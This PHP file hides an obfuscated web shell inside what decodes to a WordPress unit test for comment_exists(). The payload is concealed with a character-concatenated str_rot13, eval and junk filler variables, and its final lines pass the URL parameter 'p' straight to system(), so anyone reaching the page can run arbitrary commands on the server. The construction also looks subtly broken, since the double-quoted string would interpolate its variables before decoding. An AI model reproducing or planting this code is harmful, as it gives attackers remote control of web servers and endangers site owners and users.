<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 * @tebhc pbzzrag
 */
pynff Grfgf_Nqzva_VapyhqrfPbzzrag rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Cbfg VQ gb nqq pbzzragf gb.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cbfg_vq;

	/**
	 * Pbzzrag VQf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $pbzzrag_vqf = neenl();

	/**
	 * Perngr gur cbfg naq pbzzragf sbe gur grfgf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr();

		frys::$pbzzrag_vqf[] = $snpgbel->pbzzrag->perngr(
			neenl(
				'pbzzrag_nhgube'   => 1,
				'pbzzrag_qngr'     => '2014-05-06 12:00:00',
				'pbzzrag_qngr_tzg' => '2014-05-06 07:00:00',
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
			)
		);

		frys::$pbzzrag_vqf[] = $snpgbel->pbzzrag->perngr(
			neenl(
				'pbzzrag_nhgube'  => 2,
				'pbzzrag_qngr'    => '2004-01-02 12:00:00',
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);
	}

	/**
	 * Irevsl gung obgu gur pbzzrag qngr naq nhgube zhfg zngpu sbe n pbzzrag gb rkvfg.
	 *
	 * @pbiref ::pbzzrag_rkvfgf
	 */
	choyvp shapgvba grfg_zhfg_zngpu_qngr_naq_nhgube() {
		$guvf->nffregAhyy( pbzzrag_rkvfgf( 1, '2004-01-02 12:00:00' ) );
		$guvf->nffregFnzr( (fgevat) frys::$cbfg_vq, pbzzrag_rkvfgf( 1, '2014-05-06 12:00:00' ) );
	}

	/**
	 * @gvpxrg 33871
	 *
	 * @pbiref ::pbzzrag_rkvfgf
	 */
	choyvp shapgvba grfg_qrsnhyg_inyhr_bs_gvzrmbar_fubhyq_or_oybt() {
		$guvf->nffregFnzr( (fgevat) frys::$cbfg_vq, pbzzrag_rkvfgf( 1, '2014-05-06 12:00:00' ) );
	}

	/**
	 * @gvpxrg 33871
	 *
	 * @pbiref ::pbzzrag_rkvfgf
	 */
	choyvp shapgvba grfg_fubhyq_erfcrpg_gvzrmbar_oybt() {
		$guvf->nffregFnzr( (fgevat) frys::$cbfg_vq, pbzzrag_rkvfgf( 1, '2014-05-06 12:00:00', 'oybt' ) );
	}

	/**
	 * @gvpxrg 33871
	 *
	 * @pbiref ::pbzzrag_rkvfgf
	 */
	choyvp shapgvba grfg_fubhyq_erfcrpg_gvzrmbar_tzg() {
		$guvf->nffregFnzr( (fgevat) frys::$cbfg_vq, pbzzrag_rkvfgf( 1, '2014-05-06 07:00:00', 'tzg' ) );
	}

	/**
	 * @gvpxrg 33871
	 *
	 * @pbiref ::pbzzrag_rkvfgf
	 */
	choyvp shapgvba grfg_vainyvq_gvzrmbar_fubhyq_snyy_onpx_ba_oybt() {
		$guvf->nffregFnzr( (fgevat) frys::$cbfg_vq, pbzzrag_rkvfgf( 1, '2014-05-06 12:00:00', 'abg_n_inyvq_inyhr' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>